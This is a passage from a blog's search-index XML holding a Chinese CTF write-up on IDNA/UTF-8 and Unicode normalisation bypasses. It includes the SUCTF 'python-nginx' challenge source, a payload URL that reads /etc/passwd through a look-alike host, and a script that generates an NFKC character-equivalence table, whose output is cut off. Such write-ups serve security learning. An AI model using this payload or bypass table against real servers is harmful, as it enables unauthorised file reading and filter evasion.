<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>遇到的编码漏洞问题</title>
      <link href="/2020/01/06/yu-dao-de-fu-wu-qi-lou-dong/"/>
      <url>/2020/01/06/yu-dao-de-fu-wu-qi-lou-dong/</url>
      
        <content type="html"><![CDATA[<h4 id="1-idna与utf-8编码漏洞"><a href="#1-idna与utf-8编码漏洞" class="headerlink" title="1.idna与utf-8编码漏洞"></a>1.idna与utf-8编码漏洞</h4><p>参考<a href="https://www.cnblogs.com/cimuhuashuimu/p/11490431.html" target="_blank" rel="noopener">https://www.cnblogs.com/cimuhuashuimu/p/11490431.html</a><br><a href="https://github.com/python-hyper/hyperlink/issues/19" target="_blank" rel="noopener">https://github.com/python-hyper/hyperlink/issues/19</a><br><img src="1.png" alt=""></p><p>suctf-python-nginx<br>源码</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Blueprint<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> escape <span class="token punctuation">,</span>render_template<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlsplit<span class="token punctuation">,</span> urlunsplit<span class="token punctuation">,</span> unquote<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Index</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">app_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/getUrl'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 111"</span>    parts <span class="token operator">=</span> list<span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 222 "</span> <span class="token operator">+</span> host    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#去掉 url 中的空格</span>    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>finalUrl<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 333"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre><p>payload</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlsplit<span class="token punctuation">,</span> urlunsplit<span class="token comment" spellcheck="true">#url = []</span>url <span class="token operator">=</span> <span class="token string">"file://suctf.cℂ/../../../etc/passwd"</span>host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname<span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'first'</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'1 '</span><span class="token operator">+</span>host<span class="token punctuation">)</span>parts <span class="token operator">=</span> list<span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'sec'</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'2 '</span><span class="token operator">+</span>host<span class="token punctuation">)</span>newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#去掉 url 中的空格</span>finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname<span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'3 '</span><span class="token operator">+</span>host<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(urllib.request.urlopen(finalUrl).read())</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'???'</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></code></pre><p><img src="2.png" alt=""><br>解法2<a href="https://www.cnblogs.com/20175211lyz/p/11470200.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11470200.html</a></p><h4 id="Unicode安全问题"><a href="#Unicode安全问题" class="headerlink" title="Unicode安全问题"></a>Unicode安全问题</h4><p><a href="https://xz.aliyun.com/t/5402" target="_blank" rel="noopener">https://xz.aliyun.com/t/5402</a><br><a href="https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-PAPER.pdf" target="_blank" rel="noopener">https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-PAPER.pdf</a><br>在线搜索unicode<a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">https://www.compart.com/en/unicode/</a><br>python2构造字符对应的等效码表脚本</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> json<span class="token keyword">from</span> unicodedata <span class="token keyword">import</span> normalize<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    debug <span class="token operator">=</span> <span class="token boolean">False</span>    tables <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        src <span class="token operator">=</span> unichr<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        dst <span class="token operator">=</span> normalize<span class="token punctuation">(</span><span class="token string">'NFKC'</span><span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> ord<span class="token punctuation">(</span>dst<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">128</span> <span class="token operator">and</span> dst <span class="token operator">!=</span> src<span class="token punctuation">:</span>                <span class="token keyword">if</span> debug<span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s (\\u%s) -- normalize --> %s (\\x%s)"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>                        src<span class="token punctuation">,</span> hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                        dst<span class="token punctuation">,</span> hex<span class="token punctuation">(</span>dst<span class="token punctuation">.</span>charAt<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                    <span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> dst <span class="token keyword">in</span> tables<span class="token punctuation">:</span>                    tables<span class="token punctuation">[</span>dst<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>src<span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    tables<span class="token punctuation">[</span>dst<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>src<span class="token punctuation">]</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>repr<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"nfctable.txt"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fh<span class="token punctuation">:</span>        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>tables<span class="token punctuation">,</span> fh<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>tables<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>得到</p><pre><code>{&quot; &quot;: [&quot;\u00a0&quot;, &quot;\u00a8&quot;, &quot;\u00af&quot;, &quot;\u00b4&quot;, &quot;\u00b8&quot;, &quot;\u02d8&quot;, &quot;\u02d9&quot;, &quot;\u02da&quot;, &quot;\u02db&quot;, &quot;\u02dc&quot;, &quot;\u02dd&quot;, &quot;\u037a&quot;, &quot;\u0384&quot;, &quot;\u0385&quot;, &quot;\u1fbd&quot;, &quot;\u1fbf&quot;, &quot;\u1fc0&quot;, &quot;\u1fc1&quot;, &quot;\u1fcd&quot;, &quot;\u1fce&quot;, &quot;\u1fcf&quot;, &quot;\u1fdd&quot;, &quot;\u1fde&quot;, &quot;\u1fdf&quot;, &quot;\u1fed&quot;, &quot;\u1fee&quot;, &quot;\u1ffd&quot;, &quot;\u1ffe&quot;, &quot;\u2000&quot;, &quot;\u2001&quot;, &quot;\u2002&quot;, &quot;\u2003&quot;, &quot;\u2004&quot;, &quot;\u2005&quot;, &quot;\u2006&quot;, &quot;\u2007&quot;, &quot;\u2008&quot;, &quot;\u2009&quot;, &quot;\u200a&quot;, &quot;\u2017&quot;, &quot;\u202f&quot;, &quot;\u203e&quot;, &quot;\u205f&quot;, &quot;\u3000&quot;, &quot;\u309b&quot;, &quot;\u309c&quot;, &quot;\ufc5e&quot;, &quot;\ufc5f&quot;, &quot;\ufc60&quot;, &quot;\ufc61&quot;, &quot;\ufc62&quot;, &quot;\ufc63&quot;, &quot;\ufe49&quot;, &quot;\ufe4a&quot;, &quot;\ufe4b&quot;, &quot;\ufe4c&quot;, &quot;\ufe70&quot;, &quot;\ufe72&quot;, &quot;\ufe74&quot;, &quot;\ufe76&quot;, &quot;\ufe78&quot;, &quot;\ufe7a&quot;, &quot;\ufe7c&quot;, &quot;\ufe7e&quot;, &quot;\uffe3&quot;], &quot;$&quot;: [&quot;\ufe69&quot;, &quot;\uff04&quot;], &quot;(&quot;: [&quot;\u207d&quot;, &quot;\u208d&quot;, &quot;\u2474&quot;, &quot;\u2475&quot;, &quot;\u2476&quot;, &quot;\u2477&quot;, &quot;\u2478&quot;, &quot;\u2479&quot;, &quot;\u247a&quot;, &quot;\u247b&quot;, &quot;\u247c&quot;, &quot;\u247d&quot;, &quot;\u247e&quot;, &quot;\u247f&quot;, &quot;\u2480&quot;, &quot;\u2481&quot;, &quot;\u2482&quot;, &quot;\u2483&quot;, &quot;\u2484&quot;, &quot;\u2485&quot;, &quot;\u2486&quot;, &quot;\u2487&quot;, &quot;\u249c&quot;, &quot;\u249d&quot;, &quot;\u249e&quot;, &quot;\u249f&quot;, &quot;\u24a0&quot;, &quot;\u24a1&quot;, &quot;\u24a2&quot;, &quot;\u24a3&quot;, &quot;\u24a4&quot;, &quot;\u24a5&quot;, &quot;\u24a6&quot;, &quot;\u24a7&quot;, &quot;\u24a8&quot;, &quot;\u24a9&quot;, &quot;\u24aa&quot;, &quot;\u24ab&quot;, &quot;\u24ac&quot;, &quot;\u24ad&quot;, &quot;\u24ae&quot;, &quot;\u24af&quot;, &quot;\u24b0&quot;, &quot;\u24b1&quot;, &quot;\u24b2&quot;, &quot;\u24b3&quot;, &quot;\u24b4&quot;, &quot;\u24b5&quot;, &quot;\u3200&quot;, &quot;\u3201&quot;, &quot;\u3202&quot;, &quot;\u3203&quot;, &quot;\u3204&quot;, &quot;\u3205&quot;, &quot;\u3206&quot;, &quot;\u3207&quot;, &quot;\u3208&quot;, &quot;\u3209&quot;, &quot;\u320a&quot;, &quot;\u320b&quot;, &quot;\u320c&quot;, &quot;\u320d&quot;, &quot;\u320e&quot;, &quot;\u320f&quot;, &quot;\u3210&quot;, &quot;\u3211&quot;, &quot;\u3212&quot;, &quot;\u3213&quot;, &quot;\u3214&quot;, &quot;\u3215&quot;, &quot;\u3216&quot;, &quot;\u3217&quot;, &quot;\u3218&quot;, &quot;\u3219&quot;, &quot;\u321a&quot;, &quot;\u321b&quot;, &quot;\u321c&quot;, &quot;\u321d&quot;, &quot;\u321e&quot;, &quot;\u3220&quot;, &quot;\u3221&quot;, &quot;\u3222&quot;, &quot;\u3223&quot;, &quot;\u3224&quot;, &quot;\u3225&quot;, &quot;\u3226&quot;, &quot;\u3227&quot;, &quot;\u3228&quot;, &quot;\u3229&quot;, &quot;\u322a&quot;, &quot;\u322b&quot;, &quot;\u322c&quot;, &quot;\u322d&quot;, &quot;\u322e&quot;, &quot;\u322f&quot;, &quot;\u3230&quot;, &quot;\u3231&quot;, &quot;\u3232&quot;, &quot;\u3233&quot;, &quot;\u3234&quot;, &quot;\u3235&quot;, &quot;\u3236&quot;, &quot;\u3237&quot;, &quot;\u3238&quot;, &quot;\u3239&quot;, &quot;\u323a&quot;, &quot;\u323b&quot;, &quot;\u323c&quot;, &quot;\u323d&quot;, &quot;\u323e&quot;, &quot;\u323f&quot;, &quot;\u3240&quot;, &quot;\u3241&quot;, &quot;\u3242&quot;, &quot;\u3243&quot;, &quot;\ufe35&quot;, &quot;\ufe59&quot;, &quot;\uff08&quot;], &quot;,&quot;: [&quot;\ufe10&quot;, &quot;\ufe50&quot;, &quot;\uff0c&quot;], &quot;0&quot;: [&quot;\u2070&quot;, &quot;\u2080&quot;, &quot;\u2189&quot;, &quot;\u24ea&quot;, &quot;\u3358&quot;, &quot;\uff10&quot;], &quot;4&quot;: [&quot;\u2074&quot;, &quot;\u2084&quot;, &quot;\u2158&quot;, &quot;\u2463&quot;, &quot;\u248b&quot;, &quot;\u32b5&quot;, &quot;\u32b6&quot;, &quot;\u32b7&quot;, &quot;\u32b8&quot;, &quot;\u32b9&quot;, &quot;\u32ba&quot;, &quot;\u32bb&quot;, &quot;\u32bc&quot;, &quot;\u32bd&quot;, &quot;\u32be&quot;, &quot;\u32c3&quot;, &quot;\u335c&quot;, &quot;\u33e3&quot;, &quot;\uff14&quot;], &quot;8&quot;: [&quot;\u2078&quot;, &quot;\u2088&quot;, &quot;\u2467&quot;, &quot;\u248f&quot;, &quot;\u32c7&quot;, &quot;\u3360&quot;, &quot;\u33e7&quot;, &quot;\uff18&quot;], &quot;&lt;&quot;: [&quot;\ufe64&quot;, &quot;\uff1c&quot;], &quot;@&quot;: [&quot;\ufe6b&quot;, &quot;\uff20&quot;], &quot;D&quot;: [&quot;\u01c4&quot;, &quot;\u01c5&quot;, &quot;\u01f1&quot;, &quot;\u01f2&quot;, &quot;\u1d30&quot;, &quot;\u2145&quot;, &quot;\u216e&quot;, &quot;\u24b9&quot;, &quot;\uff24&quot;], &quot;H&quot;: [&quot;\u1d34&quot;, &quot;\u210b&quot;, &quot;\u210c&quot;, &quot;\u210d&quot;, &quot;\u24bd&quot;, &quot;\u32cc&quot;, &quot;\u3390&quot;, &quot;\u33cb&quot;, &quot;\uff28&quot;], &quot;L&quot;: [&quot;\u013f&quot;, &quot;\u01c7&quot;, &quot;\u01c8&quot;, &quot;\u1d38&quot;, &quot;\u2112&quot;, &quot;\u216c&quot;, &quot;\u24c1&quot;, &quot;\u32cf&quot;, &quot;\uff2c&quot;], &quot;P&quot;: [&quot;\u1d3e&quot;, &quot;\u2119&quot;, &quot;\u24c5&quot;, &quot;\u3250&quot;, &quot;\u33a9&quot;, &quot;\u33d7&quot;, &quot;\u33d9&quot;, &quot;\u33da&quot;, &quot;\uff30&quot;], &quot;T&quot;: [&quot;\u1d40&quot;, &quot;\u2121&quot;, &quot;\u2122&quot;, &quot;\u24c9&quot;, &quot;\u3394&quot;, &quot;\uff34&quot;], &quot;X&quot;: [&quot;\u2169&quot;, &quot;\u216a&quot;, &quot;\u216b&quot;, &quot;\u24cd&quot;, &quot;\uff38&quot;], &quot;\\&quot;: [&quot;\ufe68&quot;, &quot;\uff3c&quot;], &quot;`&quot;: [&quot;\u1fef&quot;, &quot;\uff40&quot;], &quot;d&quot;: [&quot;\u01c6&quot;, &quot;\u01f3&quot;, &quot;\u1d48&quot;, &quot;\u2146&quot;, &quot;\u217e&quot;, &quot;\u24d3&quot;, &quot;\u3372&quot;, &quot;\u3377&quot;, &quot;\u3378&quot;, &quot;\u3379&quot;, &quot;\u3397&quot;, &quot;\u33c8&quot;, &quot;\uff44&quot;], &quot;h&quot;: [&quot;\u02b0&quot;, &quot;\u210e&quot;, &quot;\u24d7&quot;, &quot;\u3371&quot;, &quot;\u33ca&quot;, &quot;\uff48&quot;], &quot;l&quot;: [&quot;\u0140&quot;, &quot;\u01c9&quot;, &quot;\u02e1&quot;, &quot;\u2113&quot;, &quot;\u217c&quot;, &quot;\u24db&quot;, &quot;\u33d0&quot;, &quot;\u33d1&quot;, &quot;\u33d2&quot;, &quot;\u33d3&quot;, &quot;\uff4c&quot;], &quot;p&quot;: [&quot;\u1d56&quot;, &quot;\u24df&quot;, &quot;\u3376&quot;, &quot;\u3380&quot;, &quot;\u338a&quot;, &quot;\u33b0&quot;, &quot;\u33b4&quot;, &quot;\u33ba&quot;, &quot;\u33d8&quot;, &quot;\uff50&quot;], &quot;t&quot;: [&quot;\u1d57&quot;, &quot;\u24e3&quot;, &quot;\uff54&quot;], &quot;x&quot;: [&quot;\u02e3&quot;, &quot;\u2093&quot;, &quot;\u2179&quot;, &quot;\u217a&quot;, &quot;\u217b&quot;, &quot;\u24e7&quot;, &quot;\uff58&quot;], &quot;|&quot;: [&quot;\uff5c&quot;], &quot;#&quot;: [&quot;\ufe5f&quot;, &quot;\uff03&quot;], &quot;&#39;&quot;: [&quot;\uff07&quot;], &quot;+&quot;: [&quot;\u207a&quot;, &quot;\u208a&quot;, &quot;\ufb29&quot;, &quot;\ufe62&quot;, &quot;\uff0b&quot;], &quot;/&quot;: [&quot;\uff0f&quot;], &quot;3&quot;: [&quot;\u00b3&quot;, &quot;\u00be&quot;, &quot;\u2083&quot;, &quot;\u2157&quot;, &quot;\u215c&quot;, &quot;\u2462&quot;, &quot;\u248a&quot;, &quot;\u325a&quot;, &quot;\u325b&quot;, &quot;\u325c&quot;, &quot;\u325d&quot;, &quot;\u325e&quot;, &quot;\u325f&quot;, &quot;\u32b1&quot;, &quot;\u32b2&quot;, &quot;\u32b3&quot;, &quot;\u32b4&quot;, &quot;\u32c2&quot;, &quot;\u335b&quot;, &quot;\u33e2&quot;, &quot;\u33fd&quot;, &quot;\u33fe&quot;, &quot;\uff13&quot;], &quot;7&quot;: [&quot;\u2077&quot;, &quot;\u2087&quot;, &quot;\u215e&quot;, &quot;\u2466&quot;, &quot;\u248e&quot;, &quot;\u32c6&quot;, &quot;\u335f&quot;, &quot;\u33e6&quot;, &quot;\uff17&quot;], &quot;;&quot;: [&quot;\u037e&quot;, &quot;\ufe14&quot;, &quot;\ufe54&quot;, &quot;\uff1b&quot;], &quot;?&quot;: [&quot;\u2047&quot;, &quot;\u2048&quot;, &quot;\ufe16&quot;, &quot;\ufe56&quot;, &quot;\uff1f&quot;], &quot;C&quot;: [&quot;\u2102&quot;, &quot;\u212d&quot;, &quot;\u216d&quot;, &quot;\u24b8&quot;, &quot;\u33c6&quot;, &quot;\u33c7&quot;, &quot;\uff23&quot;], &quot;G&quot;: [&quot;\u1d33&quot;, &quot;\u24bc&quot;, &quot;\u3387&quot;, &quot;\u3393&quot;, &quot;\u33ac&quot;, &quot;\u33c9&quot;, &quot;\uff27&quot;], &quot;K&quot;: [&quot;\u1d37&quot;, &quot;\u212a&quot;, &quot;\u24c0&quot;, &quot;\u3385&quot;, &quot;\u33cd&quot;, &quot;\u33ce&quot;, &quot;\uff2b&quot;], &quot;O&quot;: [&quot;\u1d3c&quot;, &quot;\u24c4&quot;, &quot;\uff2f&quot;], &quot;S&quot;: [&quot;\u2120&quot;, &quot;\u24c8&quot;, &quot;\u33dc&quot;, &quot;\uff33&quot;], &quot;W&quot;: [&quot;\u1d42&quot;, &quot;\u24cc&quot;, &quot;\u33dd&quot;, &quot;\uff37&quot;], &quot;[&quot;: [&quot;\ufe47&quot;, &quot;\uff3b&quot;], &quot;_&quot;: [&quot;\ufe33&quot;, &quot;\ufe34&quot;, &quot;\ufe4d&quot;, &quot;\ufe4e&quot;, &quot;\ufe4f&quot;, &quot;\uff3f&quot;], &quot;c&quot;: [&quot;\u1d9c&quot;, &quot;\u2105&quot;, &quot;\u2106&quot;, &quot;\u217d&quot;, &quot;\u24d2&quot;, &quot;\u3388&quot;, &quot;\u339d&quot;, &quot;\u33a0&quot;, &quot;\u33a4&quot;, &quot;\u33c4&quot;, &quot;\u33c5&quot;, &quot;\uff43&quot;], &quot;g&quot;: [&quot;\u1d4d&quot;, &quot;\u210a&quot;, &quot;\u24d6&quot;, &quot;\u33ff&quot;, &quot;\uff47&quot;], &quot;k&quot;: [&quot;\u1d4f&quot;, &quot;\u24da&quot;, &quot;\u3384&quot;, &quot;\u3389&quot;, &quot;\u338f&quot;, &quot;\u3391&quot;, &quot;\u3398&quot;, &quot;\u339e&quot;, &quot;\u33a2&quot;, &quot;\u33a6&quot;, &quot;\u33aa&quot;, &quot;\u33b8&quot;, &quot;\u33be&quot;, &quot;\u33c0&quot;, &quot;\u33cf&quot;, &quot;\uff4b&quot;], &quot;o&quot;: [&quot;\u00ba&quot;, &quot;\u1d52&quot;, &quot;\u2092&quot;, &quot;\u2134&quot;, &quot;\u24de&quot;, &quot;\u3375&quot;, &quot;\uff4f&quot;], &quot;s&quot;: [&quot;\u017f&quot;, &quot;\u02e2&quot;, &quot;\u24e2&quot;, &quot;\u33db&quot;, &quot;\ufb05&quot;, &quot;\ufb06&quot;, &quot;\uff53&quot;], &quot;w&quot;: [&quot;\u02b7&quot;, &quot;\u24e6&quot;, &quot;\uff57&quot;], &quot;{&quot;: [&quot;\ufe37&quot;, &quot;\ufe5b&quot;, &quot;\uff5b&quot;], &quot;\&quot;&quot;: [&quot;\uff02&quot;], &quot;&amp;&quot;: [&quot;\ufe60&quot;, &quot;\uff06&quot;], &quot;*&quot;: [&quot;\ufe61&quot;, &quot;\uff0a&quot;], &quot;.&quot;: [&quot;\u2024&quot;, &quot;\u2025&quot;, &quot;\u2026&quot;, &quot;\ufe19&quot;, &quot;\ufe30&quot;, &quot;\ufe52&quot;, &quot;\uff0e&quot;], &quot;2&quot;: [&quot;\u00b2&quot;, &quot;\u2082&quot;, &quot;\u2154&quot;, &quot;\u2156&quot;, &quot;\u2461&quot;, &quot;\u2473&quot;, &quot;\u2489&quot;, &quot;\u249b&quot;, &quot;\u3251&quot;, &quot;\u3252&quot;, &quot;\u3253&quot;, &quot;\u3254&quot;, &quot;\u3255&quot;, &quot;\u3256&quot;, &quot;\u3257&quot;, &quot;\u3258&quot;, &quot;\u3259&quot;, &quot;\u32c1&quot;, &quot;\u335a&quot;, &quot;\u336c&quot;, &quot;\u336d&quot;, &quot;\u336e&quot;, &quot;\u336f&quot;, &quot;\u3370&quot;, &quot;\u33e1&quot;, &quot;\u33f3&quot;, &quot;\u33f4&quot;, &quot;\u33f5&quot;, &quot;\u33f6&quot;, &quot;\u33f7&quot;, &quot;\u33f8&quot;, &quot;\u33f9&quot;, &quot;\u33fa&quot;, &quot;\u33fb&quot;, &quot;\u33fc&quot;, &quot;\uff12&quot;], &quot;6&quot;: [&quot;\u2076&quot;, &quot;\u2086&quot;, &quot;\u2465&quot;, &quot;\u248d&quot;, &quot;\u32c5&quot;, &quot;\u335e&quot;, &quot;\u33e5&quot;, &quot;\uff16&quot;], &quot;:&quot;: [&quot;\u2a74&quot;, &quot;\ufe13&quot;, &quot;\ufe55&quot;, &quot;\uff1a&quot;], &quot;&gt;&quot;: [&quot;\ufe65&quot;, &quot;\uff1e&quot;], &quot;B&quot;: [&quot;\u1d2e&quot;, &quot;\u212c&quot;, &quot;\u24b7&quot;, &quot;\u33c3&quot;, &quot;\uff22&quot;], &quot;F&quot;: [&quot;\u2131&quot;, &quot;\u213b&quot;, &quot;\u24bb&quot;, &quot;\uff26&quot;], &quot;J&quot;: [&quot;\u1d36&quot;, &quot;\u24bf&quot;, &quot;\uff2a&quot;], &quot;N&quot;: [&quot;\u01ca&quot;, &quot;\u01cb&quot;, 